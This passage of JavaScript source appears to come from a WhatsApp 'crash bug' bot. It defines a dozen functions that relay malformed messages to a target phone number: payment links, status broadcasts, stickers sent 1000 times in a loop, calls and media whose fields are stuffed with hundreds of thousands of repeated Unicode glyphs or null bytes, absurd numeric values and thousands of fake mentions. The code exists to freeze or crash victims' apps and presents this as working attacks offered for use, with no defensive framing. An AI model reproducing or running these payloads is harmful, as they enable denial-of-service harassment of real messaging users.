            },
            {
                participant: { jid: target }
            }
        );
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
    }
}

async function PayLink(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: " ./R4LDZ EXE", 
          previewType: 6,
          contextInfo: {
            mentionedJid: Array.from({ length: 100 }, (_, z) => `628${z + 1}@s.whatsapp.net`)
          },
          paymentLinkMetadata: {
            button: {
              displayText: "Bro?"
            }, 
            header: {
              headerType: 2
            }, 
            provider: {
              paramsJson: "{".repeat(10000) 
            }
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target }
  }) 
}


async function inTers(sock, target) {
  await sleep(1000);
  await sock.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "\u0000",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "Ai_Assisten",
              creator: " - "
            },
            statusAttributionType: 2,
            urlTrackingMap: {
              urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
                type: 1
              })),
            },
            participant: sock.user.id
          },
          body: {
            text: "x",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{ X: { status:true } }",
            version: 3
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  })

  await sock.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "\0",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "X",
              creator: "XAta"
            },
            statusAttributionType: 2,
            urlTrackingMap: {
              urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
                type: 1
              })),
            },
            participant: sock.user.id
          },
          body: {
            text: "Button_Default",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{ X: { status: false } }",
            version: 3
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  })
}

async function D3nss(sock, target) {
  const StanzaSock = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Gw Rizz Bang‌",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: " " + "ꦽ".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    id: null
                  })
                },
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                  })
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𑜦𑜠".repeat(10000),
                    copy_code: "𑜦𑜠".repeat(10000)
                  })
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    icon: "PROMOTION",
                    flow_cta: "PAYMENT_PROMOTION",
                    flow_message_version: "3"
                 })
               }
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, StanzaSock, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
} 


async function lockGB(sock, target) {
sock.relayMessage(
target,
{
locationMessage: {
degreesLatitude: 1010101,
degreesLongitude: 1010101,
name: "funny loc ¿? " + "ꦽ".repeat(60000),
address: ".sevrin444 ( @rraldz )",
url: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/" + "ꦽ".repeat(60000),
clickToWhatsappCall: true,
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
mentionedJid: [target,"13135550002@s.whatsapp.net"]
}
}
},
{ /* participant: {jid: target} */ }
)
}

 async function sticXcrash(sock, target) {
  try {
    await sock.sendMessage(target, { text: " dens - Execute" });
    
    for (let r = 0; r < 1000; r++) {
      await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
              fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
              fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
              mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
              mimetype: "image/webp",
              directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
              fileLength: "10610",
              mediaKeyTimestamp: "1775044724",
              stickerSentTs: "1775044724091"
            }
          }
        }
      }, { participant: { jid: target }, messageId: null });
    }
  } catch (error) {
    console.error("Error:", error);
  }
}

async function callCrash(sock, target) {
  await sock.relayMessage(
    int,
    {
      albumMessage: {
        contextInfo: {
          mentionedJid: Array.from(
            { length: 2000 },
            () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
          remoteJid: " ¡!deadcodex!¡ ",
          parentGroupJid: "0@g.us",
          isQuestion: true,
          isSampled: true,
          parentGroupJid: "\u0000",
          entryPointConversionDelaySeconds: 6767676767,
          businessMessageForwardInfo: null,
          botMessageSharingInfo: {
            botEntryPointOrigin: {
              origins: "BOT_MESSAGE_ORIGIN_TYPE_AI_INITIATED"
            },
            forwardScore: 999
          },
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "@xrelly • #fvcker 🩸",
                    format: "EXTENSIONS_1",
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(1000000),
                    version: 1,
                  },
                },
              },
            },
          },
        },
      },
    },
    {
      participant: { jid: target},
    }
  );
}


async function mentionki(sock, target, mention) {
  let msg = generateWAMessageFromContent(
    target,
    {
      imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "YATIM™",
      firstScanLength: 999999999,
      firstScanSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      experimentGroupId: 999999999,
      interactiveAnnotations: [],
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      annotations: [],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0=",
      midQualityFileEncSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
    },
    {}
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "i'm dens",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permissiom_request",
              paramsJson: "\u0010".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 2000 }, () =>
                  1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              conversionPointSource: "call_permissiom_request"
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(
    target,
    {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25,
            timestamp: Math.floor(Date.now() / 1000)
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
}
  
async function crashGroup(sock, target) {
  const payload = {
    extendedTextMessage: {
      text: "DENIS" + "ꦽ".repeat(45000),
      description: " ayun<3 ",
      title: "denis is back?!! ",
      paymentLinkMetadata: {
        button: { displayText: "  @DENIS fucker" },
        header: { headerType: 1 },
        provider: { paramsJson: "{{".repeat(10000) },
      },
      linkPreviewMetadata: {
        paymentLinkMetadata: {
          button: { displayText: "  @xrelly fucker" },
          header: { headerType: 1 },
          provider: { paramsJson: "{{".repeat(10000) },
        },
        scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
        urlMetadata: { fbExperimentId: 999 },
        fbExperimentId: 888,
        linkMediaDuration: 555,
        socialMediaPostType: 1221,
      },
    },
  };

  const groupPayload = {
    groupStatusMessageV2: {
      message: payload,
    },
  };

  const msg = generateWAMessageFromContent(target, groupPayload, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    //userJid: target,
  });
  
  await sleep(2000);
  
  await sock.sendMessage(target, {
      delete: {
        remoteJid: target,
        fromMe: true,
        id: msg.key.id,
      }
    })
}

async function iosXv(client, target) {
  await client.relayMessage(
    target,
    {
      requestPhoneNumberMessage: {
        skipType: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
        contextInfo: {
          remoteJid: "status@broadcast",
          externalAdReply: {
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            body: "𑇂𑆵𑆴𑆿".repeat(15000),
            mediaType: "DOCUMENT",
            renderLargerThumbnail: true,
            containsAutoReply: true,
            showAdAttribution: true,
            thumbnail: { url: "https://files.catbox.moe/0iq0n3.jpg" },
            sourceUrl: `https://${"𑇂𑆵𑆴𑆿".repeat(15000)}.wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior-iOS),,〽️/`,
          },
          quotedMessage: {
            conversation: "#Vault•¿🎭?•(Superior-iOS)" 
                          + "𑇂𑆵𑆴𑆿".repeat(15000)
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135559999@s.whatsapp.net",
            businessDescrbiption: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
          },
          mentionedJid: ["0@s.whastapp.net"],
          forwardedNewsletterMessageInfo: {
            newsletterJid: "666-666@g.us",
            serverMessageId: 1,
            newsletterName: "؂ن؃؄ٽ؂ن؃",
            contentType: "UPDATE",
          },
        },
      },
    },
    {
      participant: {jid: target}
    }
  );
}

async function K7(sock, target) {
  try {
    await sock.relayMessage(
      target,
      {
        requestPaymentMessage: {
          currencyCodeIso4217: "ARC",
          requestFrom: target,
          expiryTimestamp: Date.now() + 8000,
          amount: {
            value: 999999999,
            offset: 100,
            currencyCode: "ARC"
          },
          
          contextInfo: {
            externalAdReply: {
              title: "leicasXRAT",
              body: "҈⃝⃞⃟⃠⃤⃞⃟⃠⃤".repeat(20000),
              mimetype: "audio/mpeg",
              caption: "҈⃝⃞⃟⃠⃤⃞⃟⃠⃤".repeat(20000),
              showAdAttribution: true,
              sourceUrl: "https://t.me/addstickers/GyzenLoww",
              thumbnailUrl: "https://files.catbox.moe/jbckt2.jpg"
            }
          }
        }
      },
      
      {
        participant: { jid: target },
        messageId: null,
        userJid: target,
        quoted: null
      }
    );

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: generateWAMessageFromContent(
            target,
            {
              viewOnceMessage: {
                message: {
                  locationMessage: {
                    degreesLatitude: -66.666,
                    degreesLongitude: 66.666,
                    name: "LeicasXRAT" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
                    jpegThumbnail: null,
                    url: `https://t.me/addstickers/pahinaTzy` + `𑆵𑆴𑆿`.repeat(25000),
                    contextInfo: {
                      participant: target,
                      forwardingScore: 9999,
                      isForwarded: true,
                      stanzaId: target,
                      mentionedJid: [target]
                    }
                  }
                }
              }
            },
            {}
          )
        }
      },
      
      { participant: { jid: target } }
    );

    await sock.relayMessage(
      target,
      {
        call: {
          callKey: Buffer.from(Math.random().toString()).toString("base64").slice(0, 20),
          callType: 1,
          fromMe: true,
          id: "VnF-" + Date.now(),
          offerTime: Math.floor(Date.now() / 1000),
          status: 1,
          to: target,
          isVideo: false,
          contextInfo: {
            mentionedJid: [target],
            participant: target,
            forwardingScore: 999
          }
        }
      },
      
      {
        participant: { jid: target },
        messageId: null
      }
    );

    console.log(`Successfully sent the bug to ${target}`);
    
    return {
      success: true,
      target: target,
      timestamp: Date.now()
    };
    
  } catch (error) {
    console.error(`Failed to send the bug to ${target}:`, error);
    
    return {
      success: false,
      target: target,
      error: error.message,
      timestamp: Date.now()
    };
  }
}


async function OrinoxCrashnoclick(sock, target) {
    const message = {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 999999999,
                height: 9999,
                width: 9999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: null,
                caption: "LeicasXRAT",
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [
                    9999999999999999999,
                    9999999999999999999,
                    9999999999999999999,
                    9999999999999999999
                ],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
              },
                body: {
                    text: "¡m ⟅༑ 𖥕𝐑𝐈𝐍𝐎𝐗" + "\u0000".repeat(60000)
                },
                nativeFlowMessage: {
                    buttons: "view_ai_message".repeat(30000)
                }
               }
            }
        };

        await sock.relayMessage(target, message, {
            participant: { jid: target }
        });

        const orinoxmsg2 = {
            interactiveMessage: {
              header: {
                hasMediaAttachment: true,
                videoMessage: {
                 url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_977428425010793_478212189942291937_n.enc?ccb=11-4&oh=01_Q5Aa4gHmH7vVbrVUvlhCySQuLF9lnjIVK1hidoRgxETJrlJVlA&oe=6A22A5A5&_nc_sid=5e03e0&mms3=true",
             directPath: "/v/t62.7161-24/10000000_977428425010793_478212189942291937_n.enc?ccb=11-4&oh=01_Q5Aa4gHmH7vVbrVUvlhCySQuLF9lnjIVK1hidoRgxETJrlJVlA&oe=6A22A5A5&_nc_sid=5e03e0",
                 mimetype: "video/mp4",      
                caption: "Orinox",        
                mediaKey: "wv/atWfl21qU9enzJBV5pfE2OU1/ouIFO5QuRQp5Heg=",
                fileEncSha256: "P0Mc91Qhpus26uHe9iGnIfCBqOTPoaPpg3mInV2NVKk=",
                fileSha256: "yYiWMdXM82iuxVc/vTKzQ7jZMc/jgtTe+KmwGYt4hpc=",
                fileLength: "87906632",
                mediaKeyTimestamp: "1778075081",
               },
                body: {
                    text: "\u0000".repeat(60000)
                },
                nativeFlowMessage: {
                    buttons: "orinox_ai_message".repeat(40000)
                }
              }
            }
        };

        await sock.relayMessage(target, orinoxmsg2, {
            participant: { jid: target }
        });

       const orinoxmsg3 = {
            interactiveMessage: {
                body: {
                    text: "\x10".repeat(60000)
                },
                nativeFlowMessage: {
                    buttons: "\u0003".repeat(50000)
                }
            }
        };

        await sock.relayMessage(target, orinoxmsg3, {
            participant: { jid: target }
        });
}


async function IMGFRZ(sock, target) {
  await sock.relayMessage(target,
    {
      videoMessage: {
        caption: "⟨〽⃟💛✩ ᜴𝐕࿆𝐬𝐏࿆ꢵ ✩💛⃟〽⟩" + "ꦽ".repeat(65000),
        url: "https://mmg.whatsapp.net/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "xx78ONox8l/eqf3pYnJcMwiBCse3FVLKkk9jdfP5oPI=",
        fileLength: "9999999999999999e+9999999",
        seconds: 999999999,
        mediaKey: "LIHnYC8TN+vB3X9ed+nbu04NRdJ5PCmnHLXwu26o7RE=",
        height: 999999999999,
        width: -999999999999,
        fileEncSha256: "6a5lF9qeH/js+wV8W9fsrgVlXTSCd5htFyLKOCqzoHc=",
        directPath: "/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1772045071",
        jpegThumbnail: Buffer.alloc(0),
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          statusSourceType: "IMAGE",
          isForwarded: true,
          forwardingScore: 9999,
          remoteJid: "VsP`Team",
          externalAdReply: {
            title: "🦋⃰͡°͜͡⃟⿻ 𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸 " + "ꦽ".repeat(60000),
            body: "ꦽ".repeat(60000),
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            containsAutoReply: true,
            showAdAttribution: true,
            thumbnail: { url: "https://files.catbox.moe/0iq0n3.jpg" },
            sourceUrl: `https://${"ꦽ".repeat(60000)}.wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/`,
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135559999@s.whatsapp.net",
            businessDescrbiption: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
          },
          mentions: target,
          groupMentions: Array.from({ length: 1900 }, () => ({
            groupJid: `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
            groupSubject: "X"
          })),
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "Sent",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "{",
                    version: 3
                  }
                }
              }
            }
          },
          statusAttributions: [
            {
              type: "MUSIC",
              music: {
                authorName: "ꦽ".repeat(9999),
                songId: "243234016584833",
                title: "Baon Cikadap" + "ꦽ".repeat(9999),
                author: "𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸" + "ꦽ".repeat(9999),
                artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
                isExplicit: false,
              }
            },
            {
              type: "GROUP_STATUS",
              music: {
                authorName: "ꦽ".repeat(9999),
                songId: "243234016584836",
                title: "Baon Cikadap" + "ꦽ".repeat(9999),
                author: "𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸" + "ꦽ".repeat(9999),
                artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
                isExplicit: false,
              }
            }
          ],
        },
        streamingSidecar: "/PFxy0I/BUf8vbt/pW0sJ2j35YorqVHaII+thZ6V7yBUnox3c4QatbRETk7b2zb3nlQ=",
        thumbnailDirectPath: "/v/t62.36147-24/593729676_1666419884645510_6285328431371507107_n.enc?ccb=11-4&oh=01_Q5Aa3wE2rCOu-EHBRz-yTOwRKjTlNItBVyfvepZpPpsmtDULhw&oe=69C69DFE&_nc_sid=5e03e0",
        thumbnailSha256: "Cjw/0a5/5hzXKuDb6Rku26kazUYCZo0pyK8Xz35ecmo=",
        thumbnailEncSha256: "DNT9rfoBh/sCwpuOIr27W/9DwsUjP/BhZjpy3iPqFG0=",
        annotations: [
          {
            location: {
              degreesLongitude: 0,
              degreesLatitude: 0,
              name: "#Vault•¿🎭?•(Superior)"
            }, 
            polygonVertices: [
              { x: 999999999999999999, y: -999999999999999999 },
              { x: 999999999999999999, y: -999999999999999999 },
              { x: 999999999999999999, y: -999999999999999999 },
              { x: 999999999999999999, y: -999999999999999999 },
            ],
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "34028249360153165",
                songId: "243234016584833",
                title: "Baon Cikadap" + "ꦽ".repeat(9999),
                author: "𖥞 DENIS NI BANG 𒀸" + "ꦽ".repeat(9999),
                artworkDirectPath: "/v/t62.76458-24/33007276_830604333385904_5311398360527691061_n.enc?ccb=11-4&oh=01_Q5Aa3wH56VfaFfiQnInWSCwFZPy-UZPFQtqD1IGRFYWJIs_Tjg&oe=69C6BA9E&_nc_sid=5e03e0",
                artworkSha256: "ea9OLJCdRGuahQJyYKqrvHkaQg01CYjJkCEjCid2kRg=",
                artworkEncSha256: "Av+nl2omDopYfspLMfiR7w9+DiynCncYllNpze9z8PQ=",
                artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
                countryBlocklist: "",
                isExplicit: false,
                artworkMediaKey: "eSQ0o4UHYhwmUuEcGXesztrXm/tlTvDRBwoTF8dgVNA=",
                musicSongStartTimeInMs: "999999999",
                derivedContentStartTimeInMs: "999999999",
                overlapDurationInMs: "999999999",
              },
            },
            embeddedAction: true,
          },
        ],
      },
    },
    {
      participant: { jid: target },
    }
  );
}

async function blankGroup(client, target) {
  await client.relayMessage(
    target,
    {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "ꦽ".repeat(60000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(60000),
            inviteExpiration: Date.now() * 999e+21
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "{}",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: ""
          }
        ]
      },
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
      },
    },
    {}
  );
  
  await client.relayMessage(target,
    {
      extendedTextMessage: {
        text: "⤻꙳͙͡༑𝐃𝐄𝐍𝐈𝐒 𝐋𝐄𝐖𝐀𝐓 𝐍𝐈😂" + "ꦽ".repeat(60000),
        contextInfo: {
          quotedMessage: {
            groupInviteMessage: {
              groupJid: "888-62888@g.us",
              inviteCode: "Xx".repeat(10000),
              inviteExpiration: 999e+999 * Date.now(),
              groupName: "ꦽ".repeat(60000),
              caption: "ꦽ".repeat(60000),
              jpegThumbnail: ""
            }
          },
          mentionedJid: [
            "13135550002@s.whatsapp.net",
            ...Array.from({ length: 1999 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
          ],
        }
      }
    },
    {}
  );
}




async function d3nis(sock, target) {
  try {
  const currentRepeatCount = 522500;  
  const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: ".menu", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "x", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
